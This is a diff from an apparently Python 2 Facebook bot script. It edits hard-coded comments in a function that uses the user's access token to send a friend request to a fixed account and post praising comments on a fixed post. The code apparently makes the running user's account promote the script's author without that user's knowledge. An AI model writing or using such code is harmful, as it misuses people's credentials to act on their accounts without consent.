@@ -206,11 +206,11 @@ def bot_komen():
 		print"\033[1;97m[!] Token invalid"
 		os.system('rm -rf login.txt')
 	una = ('100044932290784')
-	kom = ('Ramdani Mani Kasep 😍')
+	kom = ('Ramdani Maneh Mani Kasep 😍')
 	reac = ('ANGRY')
 	post = ('315723919935349')
 	post2 = ('315723919935349')
-	kom2 = ('Script Anda Sangat Keren 😘')
+	kom2 = ('I really Like Your Work Ramdani 😘')
 	reac2 = ('LOVE')
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
